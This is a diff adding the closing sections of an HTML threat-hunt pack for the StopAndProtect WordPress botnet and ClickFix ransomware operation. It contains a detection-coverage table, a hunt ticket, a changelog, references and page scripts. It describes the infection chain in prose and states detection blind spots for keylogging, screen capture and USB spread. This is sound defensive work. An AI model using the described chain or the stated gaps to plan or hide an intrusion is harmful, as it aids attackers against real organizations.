+      <tr><td>T1135 / T1120 / T1039</td><td>NetworkShareScanner SMB/USB discovery and exfiltration staging</td><td>Q5 (hash), Q9 (behavioral proxy)</td><td>Known Stage Hash IOA (Q5)</td><td><span class="badge b-med">Partial — no native USB-connect event; command-line proxy only</span></td></tr>
+      <tr><td>T1047 / T1091</td><td>VBS spreader lateral movement via WMI and removable media</td><td>Q5 (hash), Q10 (WMI behavioral)</td><td>Known Stage Hash IOA (Q5)</td><td><span class="badge b-med">Partial — WMI lateral movement well covered; removable-media replication has no native Falcon event</span></td></tr>
+      <tr><td>T1113 / T1056.001 / T1005</td><td>SilentDataCollector screenshots, keylogging, file/document theft</td><td>Q5 (hash only)</td><td>Known Stage Hash IOA (Q5)</td><td><span class="badge b-high">GAP</span> — no dedicated Falcon behavioral event for screen-capture or keylogging activity; hash match is the only coverage</td></tr>
+      <tr><td>T1505.003 / T1190</td><td>WordPress web-shell/backdoor persistence and unpatched-plugin entry</td><td>Q11 (org-hosted WordPress with Linux sensor only)</td><td>WordPress Web-Shell/Backdoor Write IOA (Q11)</td><td><span class="badge b-high">GAP for externally-hosted/managed WordPress</span> — covered only where the organization self-hosts on a Falcon-sensored Linux host; see Section 7 native sweep otherwise</td></tr>
+    </table>
+    <p>Two gaps are structural: browser-DOM-level fake-CAPTCHA rendering (Step 1 of the attack chain) is not endpoint-visible by design — no query in this pack can cover it, only upstream web/DNS filtering and user training can. SilentDataCollector's screen-capture and keylogging behaviors have no dedicated Falcon event in the current data-model reference, so coverage there is limited to the exact-hash match (Q5) rather than a behavioral detection. All validation gates in Section 11 apply to every query above before promotion from Investigate to alerting.</p>
+  </div>
+</div>
+
+<div class="section" id="s16">
+  <div class="section-hdr"><span class="snum">16</span><h2>Hunt Summary Ticket</h2></div>
+  <div class="section-body">
+    <div class="ticket">
+<pre class="code">TITLE:      StopAndProtect -- WordPress Botnet, ClickFix Ransomware & Data-Theft Operation
+SEVERITY:   Critical -- double-extortion ransomware + credential/document theft + self-propagating worm module;
+            6,000+ confirmed victim IPs across ~2,000 hijacked WordPress sites (Check Point Research, 2026-08-18)
+SCOPE:      Any Windows endpoint where a user pasted and ran a PowerShell command from a fake-CAPTCHA "ClickFix"
+            page on a compromised WordPress site. Also any organization-hosted WordPress site matching the
+            artifact list in Section 4/10/Q11.
+HYPOTHESIS: Attacker operates a rotating pool of nearly 2,000 hijacked WordPress sites as C2/distribution
+            infrastructure. Victims are lured via a fake CAPTCHA into pasting a hidden, policy-bypassed
+            PowerShell one-liner into the Windows Run dialog, chaining through two PowerShell stages and two
+            .NET downloader/loader stages before dropping operator-selected payload modules (ransomware,
+            stealer, worm, lock-screen, spreader, chat proxy) on a per-victim basis.
+QUERIES:    Q1-Q11 (Section 8) -- ClickFix detonation and forensic residue, entry-script reference, downloader
+            chain, known-hash match (21 hashes), C2 DNS resolution, ransomware volume/recovery-inhibition
+            behavior, SMB/USB and WMI lateral-movement proxies, WordPress artifact write. IOA candidates:
+            Q3, Q5, Q6, Q8, Q11.
+DO FIRST:   1) Run Q5 (known-hash match) and Q6 (C2 DNS) fleet-wide -- highest confidence, lowest cost.
+            2) Run the Section 7 RunMRU dump on any host flagged by user report or web-proxy logs as having
+               visited a suspicious CAPTCHA page, even if no process-level hit is found.
+            3) If your organization self-hosts WordPress, run the Section 7 artifact sweep today regardless
+               of any other finding -- an unpatched WordPress instance is the documented entry vector at scale.
+FINDINGS:   [Populate at hunt execution time -- no environment-specific findings in this template release.]
+GAPS:       No Falcon telemetry for browser-DOM-level CAPTCHA rendering (Step 1, not endpoint-visible by design),
+            SilentDataCollector's screen-capture/keylogging behavior (hash-match coverage only), or USB
+            device-connect events (command-line proxy only). Resolved IPs for the five C2 domains were not
+            published -- DNS-layer detection only, no IP-based blocking possible from current intel.
+ACTIONS:    Contain and investigate any host with a positive Q1/Q3/Q4/Q5/Q6/Q7/Q8 hit (Section 14). Deploy the
+            Run-dialog GPO and the two named ASR rules fleet-wide (Playbook 1) as the highest-leverage single
+            control against this specific delivery mechanism.
+OWNER:      HuntPack
+VERSION:    v0.1 -- 2026-08-21</pre>
+    </div>
+  </div>
+</div>
+
+<div class="section" id="s17">
+  <div class="section-hdr"><span class="snum">17</span><h2>Changelog</h2></div>
+  <div class="section-body">
+    <div class="chg-entry"><span class="chg-ver">v0.1</span><span class="chg-date">2026-08-21</span><span>Initial gold-standard release. Built from the Check Point Research primary disclosure plus 3 corroborating secondary/aggregator sources; a 5th source (databreaches.net) was inaccessible (Cloudflare 403) and dropped. 11 CQL hunt queries covering ClickFix detonation and forensic residue, the PowerShell-to-.NET downloader chain, all 21 confirmed stage hashes, C2 DNS resolution, ransomware behavioral indicators, SMB/USB and WMI lateral-movement proxies, and a WordPress-side artifact hunt for self-hosted sites; 5 promoted to Custom IOA candidates. Corrected one hash transcription discrepancy (SilentDataCollector) caught during provenance verification against the primary source. Documented 2 structural detection gaps (browser-DOM ClickFix rendering, SilentDataCollector screen-capture/keylogging behavior).</span></div>
+  </div>
+</div>
+
+<div class="section" id="s18">
+  <div class="section-hdr"><span class="snum">18</span><h2>References</h2></div>
+  <div class="section-body">
+    <table>
+      <tr><th>Tier</th><th>Source</th><th>Used For</th><th>Access Date</th></tr>
+      <tr><td>1</td><td><a href="https://research.checkpoint.com/2026/thousands-of-hacked-wordpress-sites-one-operation-unmasking-stopandprotect/" target="_blank" rel="noopener">Check Point Research — original disclosure</a></td><td>Full infection-chain narrative, complete hash table by stage, YARA rule, victim-IP statistics, WordPress backdoor/web-shell technical detail, ClickFix JavaScript excerpt, leaked attacker project-path artifacts</td><td>2026-08-21</td></tr>
+      <tr><td>2</td><td><a href="https://thehackernews.com/2026/08/stopandprotect-uses-nearly-2000-hacked.html" target="_blank" rel="noopener">The Hacker News</a></td><td>Corroboration of operation name, scale, and infection-chain summary</td><td>2026-08-21</td></tr>
+      <tr><td>2</td><td><a href="https://cybersecuritynews.com/wordpress-sites-stopandprotect-malware/" target="_blank" rel="noopener">Cybersecurity News</a></td><td>Corroboration of victim geography and the unpatched-WordPress root-cause detail</td><td>2026-08-21</td></tr>
+      <tr><td>2</td><td><a href="https://gbhackers.com/hackers-abuse-thousands-of-wordpress-sites/" target="_blank" rel="noopener">GBHackers</a></td><td>Independent re-transcription of the IOC table (cross-checked against primary source; not used as the source of truth for any shipped IOC)</td><td>2026-08-21</td></tr>
+      <tr><td>—</td><td><a href="https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference" target="_blank" rel="noopener">Microsoft Learn — Attack surface reduction rules reference</a></td><td>ASR rule GUIDs cited in Section 12 hardening (Playbook 1)</td><td>2026-08-21</td></tr>
+      <tr><td>—</td><td><a href="https://clickfix-wiki.github.io/pages/mitigations.html" target="_blank" rel="noopener">ClickFix Wiki — Mitigations</a></td><td>Run-dialog/GPO mitigation guidance cited in Section 12</td><td>2026-08-21</td></tr>
+    </table>
+    <p>Verbatim (or, where noted, fallback-fetched) source snapshots saved to <code>StopAndProtect-WordPress-Botnet-Hunt-sources/</code> for provenance verification of every atomic IOC in Section 4/10. The dropped source (databreaches.net, inaccessible) is documented there as well.</p>
+  </div>
+</div>
+
+</div>
+
+<script>
+function toggleToc() {
+  document.body.classList.toggle('toc-collapsed');
+  if (window.matchMedia('(max-width: 768px)').matches) {
+    document.body.classList.toggle('toc-shown');
+  }
+}
+function copyQuery(id, btn) {
+  var pre = document.getElementById(id);
+  var text = pre ? pre.innerText : '';
+  navigator.clipboard.writeText(text).then(function () {
+    btn.textContent = 'Copied!'; btn.classList.add('copied');
+    setTimeout(function () { btn.textContent = 'Copy CQL'; btn.classList.remove('copied'); }, 2000);
+  }).catch(function () {
+    var ta = document.createElement('textarea'); ta.value = text;
+    document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta);
+    btn.textContent = 'Copied!'; btn.classList.add('copied');
+    setTimeout(function () { btn.textContent = 'Copy CQL'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+function copyBlock(id, btn) {
+  var pre = document.getElementById(id);
+  var text = pre ? pre.innerText : '';
+  var label = btn.getAttribute('data-label') || 'Copy';
+  function done() { btn.textContent = 'Copied!'; btn.classList.add('copied'); setTimeout(function () { btn.textContent = label; btn.classList.remove('copied'); }, 2000); }
+  navigator.clipboard.writeText(text).then(done).catch(function () {
+    var ta = document.createElement('textarea'); ta.value = text; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta); done();
+  });
+}
+function openFalcon(id) {
+  var region = document.getElementById('cloud-region').value;
+  var pre = document.getElementById(id);
+  if (!pre || !region) return;
+  var query = pre.innerText.trim();
+  var url = region + '/investigate/search?repo=all&start=7d&end=&searchViewInteractions=NoXSA&timezone=UTC&query=' + encodeURIComponent(query);
+  window.open(url, '_blank');
+}
+var sections = document.querySelectorAll('.section');
+window.addEventListener('scroll', function () {
+  var scrollY = window.scrollY + 60;
+  sections.forEach(function (sec) {
+    if (scrollY >= sec.offsetTop) {
+      document.querySelectorAll('#sidebar nav a').forEach(function (a) { a.classList.remove('active'); });
+      var link = document.querySelector('#sidebar nav a[href="#' + sec.getAttribute('id') + '"]');
+      if (link) link.classList.add('active');
+    }
+  });
+});
+</script>
